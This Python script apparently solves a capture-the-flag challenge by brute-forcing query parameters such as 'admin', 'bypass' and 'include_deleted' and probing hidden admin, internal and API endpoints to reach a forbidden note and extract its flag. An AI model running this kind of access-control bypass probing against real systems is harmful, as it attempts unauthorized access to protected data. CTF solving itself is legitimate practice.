#!/usr/bin/env python3
"""
Ultimate Ghost Draft solver
Try every possible parameter combination
"""

import requests

BASE = "https://ghost.vishwactf.com"
TOKEN = "draftkey123"

# Try all parameter combinations for note 13
params_to_try = [
    {"token": TOKEN},
    {"token": TOKEN, "include_deleted": "true"},
    {"token": TOKEN, "include_deleted": "1"},
    {"token": TOKEN, "deleted": "true"},
    {"token": TOKEN, "show_deleted": "true"},
    {"token": TOKEN, "force": "true"},
    {"token": TOKEN, "admin": "true"},
    {"token": TOKEN, "bypass": "true"},
    {"token": TOKEN, "override": "true"},
    {"token": TOKEN, "include": "deleted"},
    {"token": TOKEN, "filter": "none"},
    {"token": TOKEN, "all": "true"},
    {"token": TOKEN, "draft": "true"},
    {"token": TOKEN, "mode": "draft"},
    {"token": TOKEN, "env": "draft"},
]

print("[*] Trying all parameter combinations for note 13...")
for params in params_to_try:
    r = requests.get(f"{BASE}/note/13", params=params)
    if r.status_code == 200:
        print(f"\n[+] SUCCESS with {params}")
        print(f"    Response: {r.text}")
        if "VishwaCTF{" in r.text:
            print(f"\n[!!!] FLAG FOUND: {r.text}")
            break
    elif r.status_code != 403:
        print(f"[*] {params} -> {r.status_code}: {r.text[:100]}")

# Try accessing via different endpoints
print("\n[*] Trying different endpoint patterns...")
endpoints = [
    f"/note/13",
    f"/notes/13",
    f"/api/note/13",
    f"/api/notes/13",
    f"/draft/note/13",
    f"/internal/note/13",
    f"/admin/note/13",
]

for ep in endpoints:
    for param_set in [{"token": TOKEN}, {"token": TOKEN, "include_deleted": "true"}]:
        r = requests.get(f"{BASE}{ep}", params=param_set)
        if r.status_code == 200 and "VishwaCTF{" in r.text:
            print(f"[!!!] FLAG at {ep}: {r.text}")
            break
